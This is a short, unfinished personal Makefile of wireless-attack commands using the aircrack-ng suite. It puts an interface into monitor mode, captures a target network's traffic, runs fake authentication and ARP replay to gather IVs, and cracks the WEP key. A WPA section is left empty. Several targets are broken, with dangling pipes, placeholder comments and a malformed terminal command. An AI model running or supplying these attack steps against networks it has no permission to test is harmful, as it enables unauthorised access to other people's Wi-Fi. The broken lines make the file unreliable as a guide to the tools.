SHELL := /bin/bash


start:
	#opens a second terminal
	xfce4-terminal -T 'env PROMPT_COMMAND="unset PROMPT_COMMAND\
	history -s 
	'



#wep stuff
wepHowTo:
	echo "\n4 terminals, init(terminal 1), input vars[int and mac](manually in terminals 1-3),  \n"
#grabs the first line of the ifconfig 
#output(if its named something like 'wl'[should be since we're using the usb antenna]), 
#which will have the things you need

wepInitRest:
	ifconfig | grep 'wl' | #osmething terminal 1
	int=$1
	mac=$2
ivGen:
	sudo aireplay-ng -1 0 -e $essid -a $bssid -h $mac mon0
arpRelay:
	sudo aireplay-ng -3 -b $bssid -h $mac mon0 
crack:
	sudo aircrack-ng -b $bssid output*.cap

wepCleanup:
	sudo airmon-ng stop mon0
	sudo rm output*
	sudo rm replay*

wepMakeMon:
	sudo airmon-ng start $int $chan
wepListenMon:
	sudo airodump-ng -c $chan --bssid $bssid -w output mon0

#wpa stuff
wpa:
	echo "\ninit, \n"

wpa2Init:

#General Use

#this will output all available networks broacasting
initTerm1:
	ifconfig | grep 'wl' | #osmething terminal 1
	int=$1
	mac=
	sudo airmon-ng start $int $chan
	sudo airodump-ng -c $chan --bssid $bssid -w output mon0
#maybe add something that parses like a regex to just pull and set the values automagically

#setting up vars on any and all terminals
wanScan:
	sudo iwlist $int scan | grep -E '(Address:|Channel:|ESSID:)' | grep #something
	essid=
	bssid=
	chan=

#halts the network manager and turns the $int device off
stopNetworkMan:
	sudo /etc/init.d/network-manager stop
	sudo ifconfig $int down
